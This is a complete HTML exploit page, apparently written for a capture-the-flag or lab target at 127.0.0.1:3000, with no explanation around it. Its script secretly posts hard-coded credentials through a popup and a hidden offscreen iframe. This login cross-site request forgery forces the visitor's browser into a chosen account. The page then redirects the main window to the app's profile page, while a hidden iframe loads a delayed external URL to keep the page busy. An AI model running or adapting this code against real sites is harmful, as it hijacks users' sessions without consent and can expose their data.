<!doctype html>
<html><head><meta charset="utf-8"><title>load</title></head>
<body style="margin:0;background:#fff">
<iframe id="busy" src="https://httpbin.org/delay/9" style="position:absolute;left:-9999px;width:1px;height:1px"></iframe>
<script>
var LOGIN = 'http://127.0.0.1:3000/login';
var PROFILE = 'http://127.0.0.1:3000/profile#clearance';
var FORM = '<form id="f" method="POST" action="' + LOGIN + '">' +
  '<input name="username" value="drone9271">' +
  '<input name="password" value="DronePass9271">' +
  '</form><script>document.getElementById("f").submit();<\/scr'+'ipt>';
// 1) first-party login in a popup (sets shared cookie for 127.0.0.1:3000)
try {
  var w = window.open('', 'lg', 'width=200,height=200');
  if (w) { w.document.open(); w.document.write(FORM); w.document.close(); }
} catch(e){}
// 2) fallback: also try a same-window hidden iframe login (harmless)
try {
  var f2 = document.createElement('iframe');
  f2.name='lf2'; f2.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
  document.body.appendChild(f2);
  var frm = document.createElement('form');
  frm.method='POST'; frm.action=LOGIN; frm.target='lf2';
  frm.innerHTML='<input name=username value=drone9271><input name=password value=DronePass9271>';
  document.body.appendChild(frm); frm.submit();
} catch(e){}
// 3) after login completes, navigate MAIN window to profile
setTimeout(function(){ window.location.href = PROFILE; }, 2600);
</script>
</body></html>
